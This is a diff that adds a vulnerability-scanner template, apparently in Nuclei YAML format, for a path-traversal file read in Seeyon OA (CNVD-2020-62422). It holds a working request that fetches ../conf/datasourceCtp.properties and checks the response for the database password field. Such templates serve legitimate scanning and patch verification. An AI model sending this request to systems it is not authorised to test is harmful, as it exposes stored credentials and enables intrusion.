@@ -1,0 +1,23 @@
+id: yaml-poc-seeyon-seeyon_oa-readfile-CNVD-2020-62422
+info:
+  name: Yaml Poc Seeyon Seeyon_Oa Readfile Cnvd 2020 62422
+  author: converted
+  severity: medium
+  description: 'Converted from xpoc: yaml-poc-seeyon-seeyon_oa-readfile-CNVD-2020-62422'
+  tags: lfi
+  reference:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2020-62422
+http:
+- method: GET
+  path:
+  - /seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - ctpDataSource.password
